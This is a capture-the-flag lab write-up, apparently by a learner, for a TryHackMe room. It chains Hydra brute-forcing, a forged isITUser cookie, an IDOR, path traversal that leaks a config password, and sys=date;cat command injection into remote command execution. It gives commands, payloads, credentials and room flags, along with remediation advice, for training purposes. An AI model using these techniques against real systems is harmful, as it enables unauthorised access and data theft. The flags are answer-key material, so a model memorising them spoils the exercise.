# TryHackMe Support — From Helpdesk Access to Remote Code Execution

**Room:** Support | Web Application Vulnerabilities II | TryHackMe  
**Assessment date:** 16 October 2026  
**Environment:** TryHackMe's authorised lab; AttackBox `10.82.66.177`; target `10.82.161.94`  
**Tools:** Kali/AttackBox, Nmap, Gobuster, Hydra, Firefox Developer Tools, Burp Suite Repeater  
**Outcome:** Administrator authentication and remote command execution (RCE), proven by retrieving both room flags.

> **Scope:** All actions described here were performed against an intentionally vulnerable TryHackMe training instance. IP addresses and passwords are lab-specific. Session cookies have been redacted from the accompanying screenshots.

## Executive summary

I assessed an internal Support Operations Platform that exposed a web application on TCP port 80 and SSH on TCP port 22. Enumeration identified PHP endpoints, including `index.php`, `dashboard.php`, `api.php`, `config.php`, `footer.php`, and a theme directory named `skins`. I recovered an initial helpdesk password using a controlled wordlist test, bypassed a role restriction by changing the browser-controlled `isITUser` cookie, and found an administrator account through an IDOR vulnerability in the user API. A theme selector permitted traversal outside its intended folder and leaked PHP configuration source. I then authenticated as administrator and exploited the Date/Time feature's `sys` POST parameter to execute a second shell command and read `/home/ubuntu/user.txt`.

**The lesson:** None of these flaws should be assessed only in isolation. Weak authentication, broken access control, source disclosure and command injection formed a complete attack path from an ordinary user to server-side code execution.

## Results and evidence

| Objective | Verified result | Evidence |
|---|---|---|
| Initial login | `help@support.thm` / `snoopy` | Hydra log and successful helpdesk session |
| Admin account discovery | `specialadmin@support.thm` with `"admin": true` | [IDOR screenshot](evidence/02-idor-admin-user.png) |
| Configuration source disclosure | `$MASTER_PASSWORD = 'support@110';` | [Source view](evidence/03-config-source-disclosure.png) |
| Administrator authentication | Worked with `specialadmin@support.thm` / `support110` | [Admin flag screenshot](evidence/04-administrator-flag.png) |
| Question 1 | `THM{I_AM_ADMIN999}` | [Admin flag screenshot](evidence/04-administrator-flag.png) |
| Question 2 | `THM{GOT_THE_FLAG001}` | [Burp command injection response](evidence/05-command-injection-flag.png) |

**Important distinction:** The disclosed configuration variable contained `support@110`, whereas the confirmed admin login used `support110`. The available evidence does **not** establish why those values differ. The write-up reports both observations without claiming one was automatically derived from the other.

## Screenshot evidence gallery

The following screenshots were captured during the lab. Any exposed session-cookie values have been redacted.

**1. Cookie-based role bypass and Internal API access**

![Cookie-based role bypass and API](evidence/01-cookie-bypass-and-api.png)

**2. IDOR reveals the administrator's profile**

![IDOR administrator user discovery](evidence/02-idor-admin-user.png)

**3. Path traversal exposes PHP configuration source**

![PHP configuration source disclosure](evidence/03-config-source-disclosure.png)

**4. Administrator authentication and first flag**

![Administrator authentication and flag](evidence/04-administrator-flag.png)

**5. OS command injection and second flag in Burp Suite Repeater**

![Remote command execution in Burp Repeater](evidence/05-command-injection-flag.png)

## 1. Reconnaissance: identify the attack surface

I began by defining the target and saving my reconnaissance output:

```bash
export RHOST=10.82.161.94
export URL=http://$RHOST
mkdir -p ~/thm-support && cd ~/thm-support
nmap -sC -sV -p- "$RHOST" -oN nmap.txt
```

The scan reported:

```text
22/tcp open ssh  OpenSSH 9.6p1 Ubuntu 3ubuntu13.11
80/tcp open http Apache httpd 2.4.58 (Ubuntu)
http-title: Support Operations Panel
PHPSESSID: httponly flag not set
```

**Why I ran this:** Port scanning identifies reachable services; service detection helps me choose application-specific testing. The HTTP title matched the assigned target. Nmap additionally flagged a missing `HttpOnly` attribute for `PHPSESSID`. That is a session-hardening issue, **not** proof of session theft or XSS.

**How to spot this class of issue:** Look for unexpected management services, web framework hints, HTTP headers and cookies that suggest weak security controls. Avoid concluding that a service banner alone means the service is vulnerable.

I then enumerated discoverable paths:

```bash
gobuster dir \
  -u "$URL" \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,txt,html,bak \
  -t 10 \
  -o gobuster.txt
```

Noteworthy results included:

```text
/api.php        (302 -> index.php)
/config.php     (200, size 0)
/dashboard.php  (302 -> index.php)
/footer.php     (200)
/index.php      (200)
/info.php       (200)
/skins          (301 -> /skins/)
```

**Why these results mattered:** The `302` redirects on the API and dashboard suggested authentication gates. The `skins` folder and later observed theme dropdown suggested dynamic file selection. A directly requested `config.php` returned a `200` with an empty body; that response by itself did **not** disclose the PHP source. `/info.php` was discoverable, but I did not document extracting information from it.

## 2. Initial access: password discovery with Hydra

The first attempt used the hostname `support.thm` and failed:

```text
[ERROR] could not resolve address: support.thm
0 valid password found
```

**Reason:** The lab hostname was not resolving in the AttackBox. This was not evidence that the credentials were invalid. I corrected the target to the provided IP address:

```bash
hydra -l help@support.thm \
  -P /usr/share/wordlists/rockyou.txt \
  10.82.161.94 \
  http-post-form \
  '/:email=^USER^&password=^PASS^:Invalid credentials' \
  -f -t 4 -V
```

The uploaded Hydra output confirms a valid credential pair after the wordlist reached `snoopy`:

```text
[80][http-post-form] host: 10.82.161.94 login: help@support.thm password: snoopy
[STATUS] attack finished ... (valid pair found)
1 of 1 target successfully completed, 1 valid password found
```

I authenticated to the web application and reached the helpdesk dashboard.

**Vulnerability and signal:** A low-entropy, dictionary-listed password was accepted. A successful Hydra result is more meaningful when followed by a real, authenticated application session, as happened here. A potential production fix would include strong-password controls, breached-password screening, MFA, and rate-limiting or login protection. A brute-force tool must be restricted to authorised assessments.

## 3. Broken access control: client-controlled `isITUser` cookie

After logging in, I examined the application's cookies using Firefox Developer Tools: **F12 → Storage → Cookies**. One cookie was named `isITUser`. Its value appeared to represent an IT role decision, which was a strong clue that application privilege might be based on user-controlled state.

I computed the MD5 hash for the string `true`:

```bash
echo -n 'true' | md5sum
```

```text
b326b5062b2f0e69046810717534cb09
```

I changed only the `isITUser` cookie to that value and refreshed the dashboard. The previously hidden **IT Admin Panel** became visible, including a **View API** button. See the [cookie/API evidence](evidence/01-cookie-bypass-and-api.png).

**Why it worked:** A value stored in a user's browser can be changed by that user. MD5 is a hash, not an authentication mechanism or a server-verifiable authorisation decision. Hashing the word `true` does not make a privilege claim trustworthy. The application appeared to use this controllable value for access decisions or access to privileged features.

**How to spot it:** Inspect cookies and other request parameters named `role`, `admin`, `isAdmin`, `isITUser`, `group`, etc. Compare an ordinary account's visible features before and after controlled modification. Confirm any privileged server-side endpoint actually enforces access control; do not rely solely on a menu appearing.

**Classification:** Broken access control / improper authorisation (CWE-863), with client-controlled security state (CWE-807).

## 4. IDOR: read the administrator's user record

The Internal User API displayed my profile as `/user/3` and returned:

```json
{"email":"help@support.thm","2FA":false,"admin":false}
```

The user number in the route was a clue that records might be selected by a numeric identifier. I changed the `id` query parameter:

```http
GET /api.php?id=1 HTTP/1.1
Host: 10.82.161.94
Cookie: [AUTHENTICATED SESSION REDACTED]
```

The page displayed `GET /user/1` and returned:

```json
{"email":"specialadmin@support.thm","2FA":false,"admin":true}
```

See [IDOR response screenshot](evidence/02-idor-admin-user.png).

**Why it worked:** The API allowed an authenticated helpdesk user to retrieve another user's object by choosing a different ID. The endpoint did not sufficiently enforce that the requester was entitled to access the selected account.

**How to spot it:** Watch for numeric IDs in URLs, JSON bodies, user profile routes, document downloads or API calls. Record which account you can access legitimately, alter one identifier, and compare the response. A valid `200 OK` is not enough; the evidence here is that another user's email and admin role were returned.

**Classification:** Insecure Direct Object Reference (IDOR), a broken object-level authorisation problem (CWE-639).

## 5. Path traversal and PHP source disclosure through the theme selector

The dashboard footer exposed a **Select Theme** menu with links such as:

```html
<a href="?skin=default">Default</a>
<a href="?skin=red">Red</a>
<a href="?skin=green">Green</a>
<a href="?skin=blue">Blue</a>
```

**Why this stood out:** The `skin` query parameter looked like a filename selector. The directory `/skins/` was also present in enumeration results. Parameters that select templates, skins, languages or files are worth reviewing for directory traversal and local file-reading weaknesses.

I tested a path outside the intended skin directory:

```text
http://10.82.161.94/dashboard.php?skin=../config
```

The rendered dashboard still looked normal, so I inspected the **page source** using `Ctrl+U` and searched for `MASTER_PASSWORD`. The source included literal PHP code:

```php
<?php
$MASTER_PASSWORD = 'support@110';
$SITE_VER = '1.0';
$SITE_NAME = 'support_portal';
```

See [configuration source screenshot](evidence/03-config-source-disclosure.png).

**Why it worked:** The `../` sequence traversed upward from an expected skin/template location. The returned HTML contained the contents of a PHP configuration file as text, revealing a secret that normally should remain server-side. This proves file-content disclosure; the evidence does not identify the exact underlying PHP file-reading function.

**How to spot it:** Start with legitimate values (`skin=green`), then ask whether changing the selector to a relative path returns data outside the intended directory. Compare rendered pages **and raw response bodies**: source disclosure may not appear in normal visual rendering. Search for source markers such as `<?php`, `$`, `password`, `secret`, `token`, or database connection strings.

**Classification:** Path traversal (CWE-22), exposure of sensitive information (CWE-200). A secret embedded in source code is also poor credential handling.

## 6. Administrator authentication and first flag

The administrator identity was learned from the IDOR response:

```text
specialadmin@support.thm
```

I authenticated successfully using `support110` as the password and observed the **Administrator Access Confirmed** panel, even though another generic page heading still read `Welcome, Helpdesk User`.

```text
THM{I_AM_ADMIN999}
```

See [admin dashboard evidence](evidence/04-administrator-flag.png).

**Evidence caution:** The source leak displayed `support@110`, which is **not** the same string as the working administrator password `support110`. The screenshots confirm both observations, but they do not establish how the second string was obtained or whether the application transforms the leaked value. Avoid claiming a proven password-transformation algorithm without source code or testing.

## 7. OS command injection in the Date/Time action

With administrator access, I inspected the dashboard's **Date** menu and used **Burp Suite Repeater** to investigate the relevant POST request to `/dashboard.php`. The request included a form parameter named `sys`, used for the date/time operation.

The basic command-injection idea is to test whether a user-controlled string is being passed to an operating-system shell. In a shell, a semicolon separates commands. If the server treats a supplied date command as shell syntax rather than safe data, the user can append another command.

A non-destructive identity test would be:

```http
POST /dashboard.php?skin=green HTTP/1.1
Host: 10.82.161.94
Content-Type: application/x-www-form-urlencoded
Cookie: [REDACTED]

sys=date%3Bid
```

This decodes to `date;id`. The final payload visible in my actual Burp evidence was:

```http
POST /dashboard.php?skin=green HTTP/1.1
Host: 10.82.161.94
Content-Type: application/x-www-form-urlencoded
Cookie: [REDACTED]

sys=date%3Bcat%20%2Fhome%2Fubuntu%2Fuser.txt
```

Decoded command:

```bash
date;cat /home/ubuntu/user.txt
```

In Burp's response, the application returned the date followed by the requested file contents:

```text
Fri Oct 16 22:28:53 UTC 2026
THM{GOT_THE_FLAG001}
```

See [Burp Repeater proof of command execution](evidence/05-command-injection-flag.png).

**Why it worked:** `%3B` represents `;`, and `%20` represents a space in URL-encoded form data. The output shows that the application executed the appended `cat` command instead of restricting the input to a safe date-format option. This constitutes server-side command execution and arbitrary file reading within the privileges of the application process.

**How to spot it:** Review functions for server-side actions involving diagnostics, date/time, ping, DNS lookup, file conversion and backup operations. Determine whether the server receives a value that resembles a command or its arguments. In an authorised test, append a harmless command with a distinct, predictable output and verify it appears in the **response body**. An HTTP 200 status alone is not proof of exploitation.

**Classification:** OS command injection (CWE-78). This is the highest-impact demonstrated finding because the resulting commands execute on the target server. I did not demonstrate root privileges, persistence, SSH access, or access to data other than the lab target file.

## Findings and recommended fixes

| Finding | Evidence | Why it matters | Suggested remediation |
|---|---|---|---|
| Weak helpdesk password | Hydra confirmed `snoopy` | Can permit unauthorised login | Password quality checks, MFA, rate limits, alerting |
| Client-controlled role cookie | `isITUser` changed; IT Admin Panel appeared | Browser-controlled values can grant access | Server-side session-backed roles and checks on every route |
| IDOR/BOLA | `id=1` exposed admin account | Cross-account information disclosure | Check object ownership and privilege on every API request |
| Path traversal / source disclosure | `skin=../config` exposed PHP variables | Secrets and source leaked | Allowlist theme names; fixed file mapping; keep config out of readable paths |
| Command injection | `sys=` allowed `date;cat ...` | Server-side command execution | Avoid shells; use safe APIs or strict arguments; least privilege |
| Session cookie configuration | Nmap flagged missing `HttpOnly` | Possible cookie exposure to client-side script in an XSS scenario | Set `HttpOnly`, `Secure` when using HTTPS, and `SameSite` as appropriate |

Severity depends on deployment, actual privileges and exposure. The command injection is the most consequential demonstrated weakness, while the other findings enabled the chain. No CVSS score or production impact has been established from this lab.

## Attack path at a glance

```text
Nmap and Gobuster
    ↓
Login surface + PHP endpoints and /skins/
    ↓
Hydra discovers helpdesk password 'snoopy'
    ↓
Authenticated helpdesk account
    ↓
Modify browser-controlled isITUser cookie
    ↓
IT Admin Panel and internal user API
    ↓
IDOR: change id=3 to id=1
    ↓
Discover specialadmin@support.thm
    ↓
Theme traversal: skin=../config
    ↓
PHP source / secret disclosure
    ↓
Successful admin login; first flag
    ↓
Burp Repeater: inject a second command in sys
    ↓
Read /home/ubuntu/user.txt; second flag
```

## What this room taught me

The most important skill in this challenge was to **follow the trust boundaries**. A cookie named `isITUser` was not trustworthy just because it looked encoded. A numeric user identifier was not proof that the caller was authorised to read that user. A visual theme dropdown was not just cosmetic when it controlled a file path. Finally, a Date feature became a command-injection surface when its input was treated as shell syntax.

My testing process also highlighted evidence discipline: distinguish a failed hostname lookup from a password failure, verify successful Hydra results in a browser, distinguish `200 OK` from actual command execution, and record the actual difference between a disclosed secret and a working credential. These are habits I want to carry into future authorised web application penetration tests.

---

*Author's evidence pack: five screenshots, redacted where session cookies were exposed. This is an educational lab write-up, not a production penetration-test report.*
